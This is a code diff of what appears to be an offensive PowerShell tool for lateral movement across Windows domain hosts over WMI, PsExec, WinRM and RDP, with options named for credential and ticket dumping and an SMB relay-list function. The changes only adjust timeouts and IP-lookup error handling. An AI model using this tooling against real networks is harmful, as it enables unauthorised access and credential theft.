@@ -423,12 +423,10 @@ $WMIJobs = @()
 
     $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
 	$asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
-	$wait = $asyncResult.AsyncWaitHandle.WaitOne(100)
+	$wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
 	IF ($wait){ 
 		$tcpClient.EndConnect($asyncResult)
 		$tcpClient.Close()
-        $Ping = New-Object System.Net.NetworkInformation.Ping
-        $IP = $($ping.Send("$ComputerName").Address).IPAddressToString
 
 
 
@@ -439,19 +437,24 @@ $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName
 
 IF ($osinfo -and $Command -eq ""){
 
-             $Time = (Get-Date).ToString("HH:mm:ss")
-             Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
-             Write-Host "   " -NoNewline
-             Write-Host ("{0,-16}" -f $IP) -NoNewline
-             Write-Host "   " -NoNewline
-             Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-             Write-Host "   " -NoNewline
-             Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-             Write-Host "   " -NoNewline
-             Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-             Write-Host "SUCCESS " -NoNewline
-             Write-Host "Pwned!" -ForegroundColor "Cyan" -NoNewline
-             Write-host
+            Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "   " -NoNewline
+            
+            try {$Ping = New-Object System.Net.NetworkInformation.Ping
+            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+            Write-Host ("{0,-16}" -f $IP) -NoNewline}
+            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+            
+            Write-Host "   " -NoNewline
+            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
+            Write-Host "   " -NoNewline
+            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
+            Write-Host "   " -NoNewline
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "SUCCESS " -NoNewline
+            Write-Host "Pwned!" -ForegroundColor "Cyan" -NoNewline
+            Write-host
+
 
 }
 
@@ -521,7 +524,12 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
              $Time = (Get-Date).ToString("HH:mm:ss")
              Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
              Write-Host "   " -NoNewline
-             Write-Host ("{0,-16}" -f $IP) -NoNewline
+             
+             try {$Ping = New-Object System.Net.NetworkInformation.Ping
+             $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+             Write-Host ("{0,-16}" -f $IP) -NoNewline}
+             catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+             
              Write-Host "   " -NoNewline
              Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
              Write-Host "   " -NoNewline
@@ -576,7 +584,12 @@ elseif (!$osinfo){
             $Time = (Get-Date).ToString("HH:mm:ss")
             Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
             Write-Host "   " -NoNewline
-            Write-Host ("{0,-16}" -f $IP) -NoNewline
+            
+            try {$Ping = New-Object System.Net.NetworkInformation.Ping
+            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+            Write-Host ("{0,-16}" -f $IP) -NoNewline}
+            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+            
             Write-Host "   " -NoNewline
             Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
             Write-Host "   " -NoNewline
@@ -649,11 +662,9 @@ Function Method-Psexec {
         $ComputerName = $($Computer.dnshostname)
         $ScriptBlock = {
             Param($Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength)
-            $Ping = New-Object System.Net.NetworkInformation.Ping
-            $IP = $($ping.Send("$ComputerName").Address).IPAddressToString
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
-            $wait = $asyncResult.AsyncWaitHandle.WaitOne(500)
+            $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
             
             IF ($wait) {
                 $tcpClient.EndConnect($asyncResult)
@@ -841,7 +852,12 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
 
                 Write-Host "PsExec " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "   " -NoNewline
-                Write-Host ("{0,-16}" -f $IP) -NoNewline
+                
+                try {$Ping = New-Object System.Net.NetworkInformation.Ping
+                $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+                Write-Host ("{0,-16}" -f $IP) -NoNewline}
+                catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+                
                 Write-Host "   " -NoNewline
                 Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                 Write-Host "   " -NoNewline
@@ -849,11 +865,16 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
                 Write-Host "   " -NoNewline
                 Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                 Write-Host "ACCESS DENIED"
+            
             } else {
-
                 Write-Host "PsExec " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "   " -NoNewline
-                Write-Host ("{0,-16}" -f $IP) -NoNewline
+                
+                try {$Ping = New-Object System.Net.NetworkInformation.Ping
+                $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+                Write-Host ("{0,-16}" -f $IP) -NoNewline}
+                catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+                
                 Write-Host "   " -NoNewline
                 Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                 Write-Host "   " -NoNewline
@@ -936,23 +957,25 @@ Function Method-WinRM {
         $ComputerName = $Computer.dnshostname
         $ScriptBlock = {
             Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength)
-
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
-            $wait = $asyncResult.AsyncWaitHandle.WaitOne(500)
+            $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
             
             IF ($wait) {
                 $tcpClient.EndConnect($asyncResult)
                 $tcpClient.Close()
-                $Ping = New-Object System.Net.NetworkInformation.Ping
-                $IP = $($ping.Send("$ComputerName").Address).IPAddressToString
                 $Session = New-PSSession -ComputerName $ComputerName -ErrorAction "Ignore"
 
                 try {
                     Invoke-Command -Session $Session {IEX $Using:CheckAdmin} -OutVariable "AdminConfirm" -ErrorAction "Ignore" | Out-Null
                     Write-Host "WinRM " -ForegroundColor "Yellow" -NoNewline
                     Write-Host "   " -NoNewline
-                    Write-Host ("{0,-16}" -f $IP) -NoNewline
+                    
+                    try {$Ping = New-Object System.Net.NetworkInformation.Ping
+                    $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+                    Write-Host ("{0,-16}" -f $IP) -NoNewline}
+                    catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+                    
                     Write-Host "   " -NoNewline
                     Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                     Write-Host "   " -NoNewline
@@ -1012,7 +1035,12 @@ Function Method-WinRM {
                     $Time = (Get-Date).ToString("HH:mm:ss")
                     Write-Host "WinRM " -ForegroundColor Yellow -NoNewline
                     Write-Host "   " -NoNewline
-                    Write-Host ("{0,-16}" -f $IP) -NoNewline
+                    
+                    try {$Ping = New-Object System.Net.NetworkInformation.Ping
+                    $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+                    Write-Host ("{0,-16}" -f $IP) -NoNewline}
+                    catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+                    
                     Write-Host "   " -NoNewline
                     Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                     Write-Host "   " -NoNewline
@@ -1100,12 +1128,10 @@ $ScriptBlock = {
             Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength)
             $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
 	        $asyncResult = $tcpClient.BeginConnect($ComputerName, 3389, $null, $null)
-	        $wait = $asyncResult.AsyncWaitHandle.WaitOne(500)
+	        $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
 	        IF ($wait){ 
 		    $tcpClient.EndConnect($asyncResult)
 		    $tcpClient.Close()
-            $Ping = New-Object System.Net.NetworkInformation.Ping
-            $IP = $($ping.Send("$ComputerName").Address).IPAddressToString
 
 function Invoke-SharpRDP{
     [CmdletBinding()]
@@ -1137,7 +1163,12 @@ IF ($Password -ne ""){$output = Invoke-SharpRDP -Command "username=$Domain\$User
             
             Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
             Write-Host "   " -NoNewline
-            Write-Host ("{0,-16}" -f $IP) -NoNewline
+            
+            try {$Ping = New-Object System.Net.NetworkInformation.Ping
+            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+            Write-Host ("{0,-16}" -f $IP) -NoNewline}
+            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+            
             Write-Host "   " -NoNewline
             Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
             Write-Host "   " -NoNewline
@@ -1150,7 +1181,12 @@ IF ($Password -ne ""){$output = Invoke-SharpRDP -Command "username=$Domain\$User
             $Time = (Get-Date).ToString("HH:mm:ss")
             Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
             Write-Host "   " -NoNewline
-            Write-Host ("{0,-16}" -f $IP) -NoNewline
+            
+            try {$Ping = New-Object System.Net.NetworkInformation.Ping
+            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+            Write-Host ("{0,-16}" -f $IP) -NoNewline}
+            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+            
             Write-Host "   " -NoNewline
             Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
             Write-Host "   " -NoNewline
@@ -1165,7 +1201,12 @@ IF ($Password -ne ""){$output = Invoke-SharpRDP -Command "username=$Domain\$User
     $Time = (Get-Date).ToString("HH:mm:ss")
             Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
             Write-Host "   " -NoNewline
-            Write-Host ("{0,-16}" -f $IP) -NoNewline
+            
+            try {$Ping = New-Object System.Net.NetworkInformation.Ping
+            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+            Write-Host ("{0,-16}" -f $IP) -NoNewline}
+            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+            
             Write-Host "   " -NoNewline
             Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
             Write-Host "   " -NoNewline
@@ -2072,15 +2113,18 @@ Function GenRelayList {
         $ComputerName = $($Computer.dnshostname)
             $OS = $Computer.operatingsystem
             $Signing = Get-SMBSigning -Target $ComputerName
-            $Ping = New-Object System.Net.NetworkInformation.Ping
-            $IP = $($ping.Send("$ComputerName").Address).IPAddressToString
 
 
             if ($Signing -match "Signing Enabled") {
                 $Time = (Get-Date).ToString("HH:mm:ss")
                 Write-Host "SMB " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "   " -NoNewline
-                Write-Host ("{0,-16}" -f $IP) -NoNewline
+                
+                try {$Ping = New-Object System.Net.NetworkInformation.Ping
+                $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+                Write-Host ("{0,-16}" -f $IP) -NoNewline}
+                catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+                
                 Write-Host "   " -NoNewline
                 Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                 Write-Host "   " -NoNewline
@@ -2096,7 +2140,12 @@ Function GenRelayList {
                 $Time = (Get-Date).ToString("HH:mm:ss")
                 Write-Host "SMB " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "   " -NoNewline
-                Write-Host ("{0,-16}" -f $IP) -NoNewline
+                
+                try {$Ping = New-Object System.Net.NetworkInformation.Ping
+                $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
+                Write-Host ("{0,-16}" -f $IP) -NoNewline}
+                catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+                
                 Write-Host "   " -NoNewline
                 Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                 Write-Host "   " -NoNewline
